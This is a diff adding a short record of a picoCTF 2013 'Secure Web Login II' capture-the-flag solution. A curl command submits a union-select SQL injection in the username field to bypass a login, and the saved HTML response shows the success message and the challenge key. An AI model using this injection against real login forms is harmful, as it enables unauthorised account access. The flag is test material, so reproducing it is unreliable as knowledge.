@@ -1,0 +1,17 @@
+$ curl "https://2013.picoctf.com/problems/php4/index.php" -F "user=xxx' union select '098f6bcd4621d373cade4e832627b4f6" -F 'pass=test'
+<html>
+<head>
+Secure Web Login II
+</head>
+<body>
+
+<p>Logged in! Key: 50c90a07790d4d0ab7fc7f695cb61d0e </p>
+
+<form method=post action=index.php>
+<input type=text name=user value="Username">
+<input type=password name=pass value="Password">
+<input type=submit>
+</form>
+</body>
+<a href="index.phps">Source</a>
+</html>
